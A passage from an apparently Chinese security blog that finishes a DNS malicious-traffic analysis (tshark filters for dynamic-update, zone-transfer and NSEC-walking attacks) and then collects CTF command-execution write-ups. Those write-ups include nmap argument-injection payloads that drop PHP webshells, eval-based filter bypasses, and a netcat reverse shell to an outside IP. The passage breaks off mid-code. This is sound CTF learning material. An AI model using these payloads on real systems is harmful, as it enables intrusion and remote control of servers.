<p>排查之后，可知攻击IP（也就是排除目的IP为45.80.170.1的源IP）：127.130.104.152，175.222.102.169，105.191.150.205。</p>
</li>
</ul>
<h3 id="非法DNS-动态更新攻击">非法DNS 动态更新攻击</h3>
<ul>
<li>
<p>攻击原理</p>
<p><a href="https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2008-R2-and-2008/cc771255(v=ws.11)">这里</a>对DNS Dynamic Update有比较详细的介绍。简单地来说，DNS 客户端在 IP 地址或名称出现更改的任何时候都可利用 DNS 服务器来注册和动态更新其资源记录，攻击者可以利用 IP 欺骗伪装成 DNS 服务器信任的主机对区数据进行添加、删除和替换。</p>
</li>
<li>
<p>攻击特征：</p>
<ul>
<li><code>dns.flags.opt==5</code>显示DNS动态更新查询消息，以及相应的DNS动态更新响应消息</li>
</ul>
</li>
<li>
<p>发现过程</p>
<p>使用tshark命令筛选：<code>tshark -r q1_final.pcap -Y &quot;dns.flags.opcode==5 &amp;&amp; dns.flags.response==0&quot; -T fields -e ip.src -e ip.dst | sort | uniq -c | sort -nr|more </code></p>
<p><img src="http://ww1.sinaimg.cn/large/6e4e7200ly1g4v5ml7ag3j20u1034wgx.jpg" alt=""></p>
<p><img src="http://ww1.sinaimg.cn/large/6e4e7200ly1g4v5m8avcnj20u103lwhb.jpg" alt=""></p>
<p>可以看到，有四个攻击IP：19.220.251.87 414，200.152.141.106 15，18.100.48.86 4091，237.205.156.233 535</p>
</li>
</ul>
<h3 id="非法DNS域传输攻击">非法DNS域传输攻击</h3>
<ul>
<li>
<p>攻击原理</p>
<p>辅 DNS 服务器，需要与主 DNS 服务器进行通信，加载数据信息，称为区域传送（Zone Transfer）。AXFR 请求，常导致全区域传送，需要花费大量的时间与带宽。</p>
<p>大量的 AXFR 、IXFR请求，可导致 DDoS。权限配置不当，可导致信息泄露（测试域名、内部域名）。</p>
</li>
<li>
<p>攻击特征</p>
<p><code>dns.flags.repsonse==0 &amp;&amp; dns.qry.type==252 || dns.qry.type==251</code></p>
</li>
<li>
<p>发现过程</p>
<p>我们用过滤器<code>dns.qry.type in &#123;251 252&#125;</code>把AXFR和IXFR过滤出来，查看有哪些疑似攻击IP</p>
<p><img src="http://ww1.sinaimg.cn/large/6e4e7200ly1g4xcp6egw1j20u602n76f.jpg" alt=""></p>
<p><img src="http://ww1.sinaimg.cn/large/6e4e7200ly1g4xcpjs2jmj20u1025abs.jpg" alt=""></p>
<p>有两个221.223.19.169 和一个129.191.74.107 发来的域传送请求包，以及大量的96.199.230.176 发来的域传送请求包。仔细检查一下前两个IP地址的数据包后，我们认为前面两个有可能是管理员配置不当等造成的，<br>
而最后的一个大量的请求数据包显然就是域传送攻击了。</p>
<p><img src="http://ww1.sinaimg.cn/large/6e4e7200ly1g4xg9i185aj210q0fsq4l.jpg" alt=""></p>
<p><img src="http://ww1.sinaimg.cn/large/6e4e7200ly1g4xgkoujpxj20pn0cldgg.jpg" alt=""></p>
</li>
</ul>
<h3 id="DNSSec-NSec-域名遍历攻击">DNSSec NSec 域名遍历攻击</h3>
<ul>
<li>
<p>攻击原理</p>
<p><a href="https://www.cloudxns.net/Support/detail/id/1309.html">DNSSec的概念与作用</a></p>
<p><a href="https://info.menandmice.com/blog/bid/73645/Take-your-DNSSEC-with-a-grain-of-salt">NSEC：Walking a DNS zone</a></p>
<p>NSEC枚举这是针对DNSSEC的一种攻击，在未使用NSEC3的DNSSEC中，若查询区文件中不存在的域名，会以NSEC记录的形式提供靠近其的最近的下一条域名，这就造成了可能构造特殊请求，来遍历区文件，造成区文件的泄露。</p>
</li>
<li>
<p>攻击特征</p>
<p>域名遍历攻击依赖于NSec资源记录类型，可以使用``dns.resp.type==47`进行初步筛选</p>
</li>
<li>
<p>发现过程</p>
<p><img src="http://ww1.sinaimg.cn/large/6e4e7200ly1g4zkhyihryj210q0exwgu.jpg" alt=""></p>
<p>可以看到我们把ANY反射型Dos攻击也筛选出来了，于是再加上<code>not dns.qry.type==255</code>条件就可以得到DNSSec NSec 域名遍历攻击IP：6.116.183.244</p>
<p><img src="http://ww1.sinaimg.cn/large/6e4e7200ly1g4zjhnxh23j210s0etmzh.jpg" alt=""></p>
</li>
</ul>
<h2 id="Q-A">Q&amp;A</h2>
<ol>
<li>
<h5 id="pacp包文件过大，Wireshark加载失败">pacp包文件过大，Wireshark加载失败</h5>
<p>解决办法：使用 <code>editcap -c &lt;packets per file&gt; 原始文件.pcap 输出文件.pcap</code> 命令；或者使用<code>tcpdump -r old_file -w new_files -C 10</code>，在这个例子中，每个文件的大小是10 million字节。</p>
</li>
<li>
<h5 id="bash管道格式化输出命令">bash管道格式化输出命令</h5>
<ul>
<li><a href="https://blog.csdn.net/u010003835/article/details/80752797">tr</a></li>
<li><a href="https://www.jianshu.com/p/291632a11ede">sort -nc</a></li>
<li><a href="https://blog.csdn.net/u014756827/article/details/78949924">sort | uniq -c</a></li>
<li><a href="https://www.cnblogs.com/xiaoleiel/p/8349487.html">awk</a></li>
<li><a href="https://www.runoob.com/linux/linux-comm-more.html">more</a></li>
<li><a href="https://www.cnblogs.com/blogoflee/archive/2012/02/10/2344939.html">wc</a></li>
</ul>
</li>
<li>
<h5 id="几个经常用到的DNS显示过滤器的实例">几个经常用到的DNS显示过滤器的实例</h5>
<ul>
<li><code>dns.flags.response=0</code>(DNS查询消息)</li>
<li><code>dns.flags.response=1</code>(DNS响应消息)</li>
<li><code>dns.flags.rcode=0</code>(显示RCODE字段值为0(Noerror)的DNS应答消息)</li>
<li><code>dns.flags.rcode=3</code>(显示RCODE字段值为3(NXDomain,表示域名不存在)的DNS应答消息)</li>
<li><code>dns.flags.opcode=0</code>(显示DNS常规查询消息，以及相应的DNS响应消息)</li>
<li><code>dns.flags.opcode=1</code>(显示DNS逆向查询消息，以及相应的DNS响应消息)</li>
<li><code>dns.flags.opcode=2</code>(显示DNS服务器状态请求查询消息，以及相应的DNS服务器状态响应消息)</li>
<li><code>dns.flags.opcode=5</code>(显示DNS动态更新查询消息，以及相应的DNS动态更新响应消息)</li>
<li><code>dns.flags.recdesired=1</code>(RD标记位置1的DNS查询消息一般为主机发出，目的是要求接受该消息的DNS服务器执行递归查询)</li>
<li><code>dns.flags.recdesired=0</code>(显示RD标记位置0的DNS递归反复查询及响应消息)</li>
</ul>
</li>
<li>
<h5 id="常用的查询字段">常用的查询字段</h5>
<table>
<thead>
<tr>
<th>字段</th>
<th>描述</th>
<th>字段</th>
<th>描述</th>
</tr>
</thead>
<tbody>
<tr>
<td>frame.len</td>
<td>数据长度</td>
<td>dns.flags.authenticated</td>
<td>服务器是否为域权威服务器</td>
</tr>
<tr>
<td>ip.src</td>
<td>源IP</td>
<td>dns.flags.checkisable</td>
<td>非认证数据是否可接收</td>
</tr>
<tr>
<td>ip.dst</td>
<td>目的IP</td>
<td>dns.flags.rcode</td>
<td>DNS reply code</td>
</tr>
<tr>
<td>udp.srcport</td>
<td>源udp端口号</td>
<td>dns.count.quires</td>
<td>数据包中DNS请求数</td>
</tr>
<tr>
<td>udp.dstport</td>
<td>目的udp端口号</td>
<td>dns.count.answers</td>
<td>数据包中DNS回答数</td>
</tr>
<tr>
<td>eth.src</td>
<td>源MAC地址</td>
<td>dns.count.auth_rr</td>
<td>数据包中权威记录数</td>
</tr>
<tr>
<td>eth.dst</td>
<td>目的MAC地址</td>
<td>dns.count.add_rr</td>
<td>数据包中额外记录数</td>
</tr>
<tr>
<td><a href="http://dns.id">dns.id</a></td>
<td>DNS Transaction ID</td>
<td><a href="http://dns.qry.name">dns.qry.name</a></td>
<td>DNS请求名</td>
</tr>
<tr>
<td>dns.flags.response</td>
<td>DNS请求/现有响应标志</td>
<td>dns.qry.class</td>
<td>DNS请求类型</td>
</tr>
<tr>
<td>dns.flags.opcode</td>
<td>DNS opcode</td>
<td><a href="http://dns.resp.name">dns.resp.name</a></td>
<td>DNS响应名</td>
</tr>
<tr>
<td>dns.flags.authoritative</td>
<td>应答是否被服务器认证</td>
<td>dns.resp.type</td>
<td>DNS回复类型</td>
</tr>
<tr>
<td>dns.flags.truncated</td>
<td>消息是否被截断</td>
<td>dns.resp.ttl</td>
<td>DNS响应生存时间</td>
</tr>
<tr>
<td>dns.flags.recdesired</td>
<td>是否递归查询</td>
<td><a href="http://dns.resp.z.do">dns.resp.z.do</a></td>
<td>DNS是否支持DNSSEC</td>
</tr>
<tr>
<td>dns.flags.reavail</td>
<td>服务器是否能递归查询</td>
<td>frame.time_relative</td>
<td>frame相对时间</td>
</tr>
</tbody>
</table>
</li>
<li>
<h5 id="常用查询字段类型">常用查询字段类型</h5>
<table>
<thead>
<tr>
<th>TYPE</th>
<th>值</th>
<th>含义</th>
</tr>
</thead>
<tbody>
<tr>
<td>A</td>
<td>1</td>
<td>主机地址</td>
</tr>
<tr>
<td>NS</td>
<td>2</td>
<td>权威服务器</td>
</tr>
<tr>
<td>CNAME</td>
<td>5</td>
<td>别名的正则名称</td>
</tr>
<tr>
<td>SOA</td>
<td>6</td>
<td>标记权威区域的开始</td>
</tr>
<tr>
<td>PTR</td>
<td>12</td>
<td>域名指针</td>
</tr>
<tr>
<td>MX</td>
<td>15</td>
<td>邮件交换</td>
</tr>
<tr>
<td>TXT</td>
<td>16</td>
<td>文本字符串</td>
</tr>
<tr>
<td>DS</td>
<td>43</td>
<td>委托签发者</td>
</tr>
<tr>
<td>IXFR</td>
<td>251</td>
<td>增量区域转移</td>
</tr>
<tr>
<td>AXFR</td>
<td>252</td>
<td>权威区域转移</td>
</tr>
<tr>
<td>*</td>
<td>255</td>
<td>所有解析记录，也成为ANY</td>
</tr>
</tbody>
</table>
</li>
</ol>
<h2 id="总结与反思">总结与反思</h2>
<p>看了很多大佬们写的Writeup，照葫芦画瓢复现了DNS恶意流量分析，期间遇到了不少的困难，比如：</p>
<ul>
<li>对DNS协议了解很少</li>
<li>数据包非常大，没有攻击流量的标注</li>
<li>对流量分析基本是零起步，不知道该从哪里开始分析，没有一个合理的逻辑思维</li>
</ul>
<p>经过这一轮的复现之后，可以说对流量分析有了一定的了解，知道了一些DNS的攻击手段以及攻击特征，还有若干非常实用的文件处理命令。但是，依然存在很多不足，所以打算以<a href="https://github.com/shyoshyo/DataCon-9102-DNS">shyoshyo</a>撰写的Writeup为模板，有条理、有逻辑的进行第二轮流量分析。</p>
]]></content>
      <categories>
        <category>流量分析</category>
        <category>比赛题</category>
      </categories>
      <tags>
        <tag>Wireshark</tag>
        <tag>流量分析</tag>
        <tag>DNS</tag>
        <tag>Datacon2019</tag>
      </tags>
  </entry>
  <entry>
    <title>buuctf刷题——命令执行</title>
    <url>/Web_security/ctf_writeup/10.buuctf%E5%88%B7%E9%A2%98%E2%80%94%E2%80%94%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/</url>
    <content><![CDATA[<h2 id="GXYCTF2019-Ping-Ping-Ping">GXYCTF2019 Ping Ping Ping</h2>
<h3 id="TODO">TODO</h3>
<h2 id="ACTF2020-新生赛-Exec">ACTF2020 新生赛 Exec</h2>
<h3 id="TODO-v2">TODO</h3>
<h2 id="BUUCTF2018-Online-Tool">BUUCTF2018 Online Tool</h2>
<h3 id="考点">考点</h3>
<ul>
<li>Nmap参数注入</li>
</ul>
<h3 id="解题">解题</h3>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_SERVER[<span class="string">&#x27;HTTP_X_FORWARDED_FOR&#x27;</span>])) &#123;</span><br><span class="line">    $_SERVER[<span class="string">&#x27;REMOTE_ADDR&#x27;</span>] = $_SERVER[<span class="string">&#x27;HTTP_X_FORWARDED_FOR&#x27;</span>];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>($_GET[<span class="string">&#x27;host&#x27;</span>])) &#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    $host = $_GET[<span class="string">&#x27;host&#x27;</span>];</span><br><span class="line">    $host = escapeshellarg($host);</span><br><span class="line">    $host = escapeshellcmd($host);</span><br><span class="line">    $sandbox = md5(<span class="string">&quot;glzjin&quot;</span>. $_SERVER[<span class="string">&#x27;REMOTE_ADDR&#x27;</span>]);</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;you are in sandbox &#x27;</span>.$sandbox;</span><br><span class="line">    @mkdir($sandbox);</span><br><span class="line">    chdir($sandbox);</span><br><span class="line">    <span class="keyword">echo</span> system(<span class="string">&quot;nmap -T5 -sT -Pn --host-timeout 2 -F &quot;</span>.$host);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>参考之前学习PHP代码审计的<a href="https://ca0y1h.top/code_audit/7.PHP%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%AD%A6%E4%B9%A0%E2%80%94%E2%80%94Day5/#PHP%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%AD%A6%E4%B9%A0Day5%E2%80%94%E2%80%94escapeshellarg%E4%B8%8Eescapeshellcmd%E4%BD%BF%E7%94%A8%E4%B8%8D%E5%BD%93">一篇文章</a>，escapeshellarg函数和escapeshellcmd函数同时使用会导致单引号逃逸。</p>
<p>测试代码：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$host = <span class="string">&quot;&#x27; &lt;?php phpinfo();?&gt; -oN shell.php &#x27;&quot;</span>;</span><br><span class="line">$host = (<span class="keyword">string</span>)$host;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;host:&quot;</span>.$host;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;/br&gt;&quot;</span>.<span class="string">&quot;\n&quot;</span>;</span><br><span class="line">$arg = escapeshellarg($host);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;arg:&quot;</span>.$arg;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;/br&gt;&quot;</span>.<span class="string">&quot;\n&quot;</span>;</span><br><span class="line">$cmd = escapeshellcmd($arg);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;cmd:&quot;</span>.$cmd;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;/br&gt;&quot;</span>.<span class="string">&quot;\n&quot;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>对于单个单引号, escapeshellarg()函数转义后,还会在左右各加一个单引号,但escapeshellcmd()函数是直接加一个转义符。<br>
对于成对的单引号, escapeshellcmd()函数默认不转义,但escapeshellarg()函数转义。<br>
host参数先经过escapeshellarg()再经过escapeshellcmd()就会出现问题。<br>
escapeshellarg 先转义了一个单引号,然后引入了一对单引号, escapeshellcmd 不会转义成对的单引号,但是会转义转移符<code>\</code>，这样, 转移符作用失效,逃逸出来一个单引号。</p>
<p>payload：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?host&#x3D;&#39; &lt;?php &#96;cat &#x2F;flag&#96;;?&gt; -oN shell.php &#39;</span><br></pre></td></tr></table></figure>
<h2 id="网鼎杯2020-朱雀组-Nmap">网鼎杯2020 朱雀组 Nmap</h2>
<h3 id="考点-v2">考点</h3>
<ul>
<li>Nmap参数注入</li>
</ul>
<h3 id="解题-v2">解题</h3>
<p>和上面一道题比较像了，都是考察Nmap参数注入，但是没有显示源码。</p>
<p>直接用Online Tool的payload进行测试</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#39; &lt;?php @eval($_POST[&quot;hack&quot;]);?&gt; -oG hack.php &#39;</span><br></pre></td></tr></table></figure>
<p>提示hacker，Fuzz之后发现应该是过滤PHP关键字，改用短标签和phtml后缀绕过。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#39; &lt;?&#x3D;@eval($_POST[&quot;hack&quot;]);?&gt; -oG hack.phtml &#39;</span><br></pre></td></tr></table></figure>
<p>没有提示其他黑名单信息，访问当前目录下的<code>hack.phtml</code>文件存在，用蚁剑连接，拿到flag。</p>
<blockquote>
<p>参考文章：<a href="https://zhuanlan.zhihu.com/p/145906109">https://zhuanlan.zhihu.com/p/145906109</a></p>
</blockquote>
<h2 id="RoarCTF2019-Easy-Calc">RoarCTF2019 Easy Calc</h2>
<h3 id="考点-v3">考点</h3>
<ul>
<li>代码审计</li>
<li>PHP的字符串解析特性Bypass：<a href="https://www.freebuf.com/articles/web/213359.html">https://www.freebuf.com/articles/web/213359.html</a></li>
</ul>
<h3 id="解题-v3">解题</h3>
<p>查看源代码：</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">&lt;script&gt;</span><br><span class="line">    <span class="comment">//对输入的特殊字符进行URL编码并以GET方式访问请求</span></span><br><span class="line">    $(<span class="string">&#x27;#calc&#x27;</span>).submit(<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        $.ajax(&#123;</span><br><span class="line">            url:<span class="string">&quot;calc.php?num=&quot;</span>+<span class="built_in">encodeURIComponent</span>($(<span class="string">&quot;#content&quot;</span>).val()),      </span><br><span class="line">            type:<span class="string">&#x27;GET&#x27;</span>,</span><br><span class="line">            success:<span class="function"><span class="keyword">function</span>(<span class="params">data</span>)</span>&#123;</span><br><span class="line">                $(<span class="string">&quot;#result&quot;</span>).html(<span class="string">`&lt;div class=&quot;alert alert-success&quot;&gt;</span></span><br><span class="line"><span class="string">            &lt;strong&gt;答案:&lt;/strong&gt;<span class="subst">$&#123;data&#125;</span></span></span><br><span class="line"><span class="string">            &lt;/div&gt;`</span>);</span><br><span class="line">            &#125;,</span><br><span class="line">            error:<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">                alert(<span class="string">&quot;这啥?算不来!&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;)</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;)</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure>
<p>访问<code>calc.php</code>：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>($_GET[<span class="string">&#x27;num&#x27;</span>]))&#123;</span><br><span class="line">    show_source(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    $str = $_GET[<span class="string">&#x27;num&#x27;</span>];</span><br><span class="line">    $blacklist = [<span class="string">&#x27; &#x27;</span>, <span class="string">&#x27;\t&#x27;</span>, <span class="string">&#x27;\r&#x27;</span>, <span class="string">&#x27;\n&#x27;</span>,<span class="string">&#x27;\&#x27;&#x27;</span>, <span class="string">&#x27;&quot;&#x27;</span>, <span class="string">&#x27;`&#x27;</span>, <span class="string">&#x27;\[&#x27;</span>, <span class="string">&#x27;\]&#x27;</span>,<span class="string">&#x27;\$&#x27;</span>,<span class="string">&#x27;\\&#x27;</span>,<span class="string">&#x27;\^&#x27;</span>];</span><br><span class="line">    <span class="keyword">foreach</span> ($blacklist <span class="keyword">as</span> $blackitem) &#123;</span><br><span class="line">        <span class="keyword">if</span> (preg_match(<span class="string">&#x27;/&#x27;</span> . $blackitem . <span class="string">&#x27;/m&#x27;</span>, $str)) &#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;what are you want to do?&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">eval</span>(<span class="string">&#x27;echo &#x27;</span>.$str.<span class="string">&#x27;;&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>第13行<code>eval</code>可以执行PHP代码，测试发现<code>num</code>参数不能输入非数字的值，否则会直接500。</p>
<p>payload：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">calc.php?%20num&#x3D;phpinfo()</span><br></pre></td></tr></table></figure>
<blockquote>
<p>例如：/?foo=bar变成Array([foo] =&gt; “bar”)。值得注意的是，查询字符串在解析的过程中会将某些字符删除或用下划线代替。例如，/?%20news[id%00=42会转换为Array([news_id] =&gt; 42)。</p>
</blockquote>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200619120244.png" alt=""></p>
<p>代码中过滤了<code>/</code>，用<code>chr</code>绕过：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;node3.buuoj.cn:26901&#x2F;calc.php?%20num&#x3D;var_dump(scandir(chr(47)))</span><br></pre></td></tr></table></figure>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200619122312.png" alt=""></p>
<p>读取<code>/f1agg</code>：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;node3.buuoj.cn:26901&#x2F;calc.php?%20num&#x3D;readfile(chr(47).chr(102).chr(49).chr(97).chr(103).chr(103))</span><br></pre></td></tr></table></figure>
<h2 id="watevrCTF-2019-Supercalc">watevrCTF-2019 Supercalc</h2>
<h3 id="TODO-v3">TODO</h3>
<h2 id="RCTF2019-calcalcalc">RCTF2019 calcalcalc</h2>
<h3 id="TODO-v4">TODO</h3>
<h2 id="De1CTF-2019-9calc">De1CTF 2019 9calc</h2>
<h3 id="TODO-v5">TODO</h3>
<h2 id="GXYCTF2019-禁止套娃">GXYCTF2019 禁止套娃</h2>
<h3 id="考点-v4">考点</h3>
<ul>
<li>Git源码泄露</li>
<li>无参数webshell</li>
</ul>
<h3 id="解题-v4">解题</h3>
<p>dirmap扫描发现有Git目录，用GitHack download下来，审计代码：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">&quot;flag.php&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;flag在哪里呢？&lt;br&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">&#x27;exp&#x27;</span>]))&#123;</span><br><span class="line">    <span class="keyword">if</span> (!preg_match(<span class="string">&#x27;/data:\/\/|filter:\/\/|php:\/\/|phar:\/\//i&#x27;</span>, $_GET[<span class="string">&#x27;exp&#x27;</span>])) &#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="string">&#x27;;&#x27;</span> === preg_replace(<span class="string">&#x27;/[a-z,_]+\((?R)?\)/&#x27;</span>, <span class="literal">NULL</span>, $_GET[<span class="string">&#x27;exp&#x27;</span>])) &#123;</span><br><span class="line">            <span class="keyword">if</span> (!preg_match(<span class="string">&#x27;/et|na|info|dec|bin|hex|oct|pi|log/i&#x27;</span>, $_GET[<span class="string">&#x27;exp&#x27;</span>])) &#123;</span><br><span class="line">                <span class="comment">// echo $_GET[&#x27;exp&#x27;];</span></span><br><span class="line">                @<span class="keyword">eval</span>($_GET[<span class="string">&#x27;exp&#x27;</span>]);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span>&#123;</span><br><span class="line">                <span class="keyword">die</span>(<span class="string">&quot;还差一点哦！&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;再好好想想！&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;还想读flag，臭弟弟！&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// highlight_file(__FILE__);</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>这个正则表达式<code>/[a-z,_]+\((?R)?\)/</code>很明显是无参数webshell，直接上payload查看当前路径下的文件：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?exp&#x3D;var_dump(scandir(pos(localeconv())));</span><br></pre></td></tr></table></figure>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200702000024.png" alt=""></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">readfile(array_rand(array_flip(scandir(current(localeconv())))));</span><br></pre></td></tr></table></figure>
<blockquote>
<p>array_rand()    函数返回数组中的随机键名，或者如果您规定函数返回不只一个键名，则返回包含随机键名的数组。<br>
array_flip()    array_flip() 函数用于反转/交换数组中所有的键名以及它们关联的键值。</p>
</blockquote>
<p>当然，还可以写header字段，然后用get_all_header()函数获得<code>flag.php</code>文件。</p>
<h2 id="BJDCTF-2nd-duangShell">BJDCTF 2nd duangShell</h2>
<h3 id="考点-v5">考点</h3>
<ul>
<li>swp文件泄露</li>
<li>反弹shell</li>
</ul>
<h3 id="解题-v5">解题</h3>
<p>打开题目提示swp文件泄露，访问<code>.index.php.swp</code>下载文件，<code>vim -r index.php.swp</code>恢复文件。</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html lang=<span class="string">&quot;en&quot;</span>&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;meta charset=<span class="string">&quot;UTF-8&quot;</span>&gt;</span><br><span class="line">    &lt;title&gt;give me a girl&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">    &lt;center&gt;&lt;h1&gt;珍爱网&lt;/h1&gt;&lt;/center&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;how can i give you source code? .swp?!&quot;</span>.<span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">if</span> (!<span class="keyword">isset</span>($_POST[<span class="string">&#x27;girl_friend&#x27;</span>])) &#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;where is P3rh4ps&#x27;s girl friend ???&quot;</span>);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    $girl = $_POST[<span class="string">&#x27;girl_friend&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span> (preg_match(<span class="string">&#x27;/\&gt;|\\\/&#x27;</span>, $girl)) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;just girl&#x27;</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (preg_match(<span class="string">&#x27;/ls|phpinfo|cat|\%|\^|\~|base64|xxd|echo|\$/i&#x27;</span>, $girl)) &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;img src=&#x27;img/p3_need_beautiful_gf.png&#x27;&gt; &lt;!-- He is p3 --&gt;&quot;</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">//duangShell~~~~</span></span><br><span class="line">        exec($girl);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>观察源代码之后发现是绕过过滤之后命令执行的题目。</p>
<p>因为过滤了$符号，所以不能采用这种黑名单拼接的方式绕过</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">a&#x3D;ca;b&#x3D;t;c&#x3D;flag;&#96;&#96;$ab&#96; &#96;$c</span><br></pre></td></tr></table></figure>
<p>禁用了base64之后不能使用base64编码绕过</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">echo &quot;Y2F0IGZsYWc&#x3D;&quot; | base64 -d</span><br></pre></td></tr></table></figure>
<p>而且exec()函数是没有回显的，又想了一些奇怪的姿势，着实不行，看师傅们的博客吧。</p>
<p>这道题用到的是反弹shell。</p>
<blockquote>
<p><a href="https://xz.aliyun.com/t/2548">https://xz.aliyun.com/t/2548</a></p>
<p><a href="https://xz.aliyun.com/t/2549">https://xz.aliyun.com/t/2549</a></p>
</blockquote>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">girl_friend&#x3D;nc 47.97.199.89 8888 -e &#x2F;bin&#x2F;bash</span><br></pre></td></tr></table></figure>
<p>本机获得shell后，查找flag</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">find &#x2F; -name *flag*</span><br></pre></td></tr></table></figure>
<h2 id="极客大挑战2019-RCE-ME">极客大挑战2019 RCE ME</h2>
<h3 id="考点-v6">考点</h3>
<ul>
<li>无数字字母的webshell</li>
<li>disable_function绕过</li>
</ul>
<h3 id="解题-v6">解题</h3>
<p>审计代码</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">&#x27;code&#x27;</span>]))&#123;</span><br><span class="line">            $code=$_GET[<span class="string">&#x27;code&#x27;</span>];</span><br><span class="line">                    <span class="keyword">if</span>(strlen($code)&gt;<span class="number">40</span>)&#123;</span><br><span class="line">                                        <span class="keyword">die</span>(<span class="string">&quot;This is too Long.&quot;</span>);</span><br><span class="line">                                                &#125;</span><br><span class="line">                    <span class="keyword">if</span>(preg_match(<span 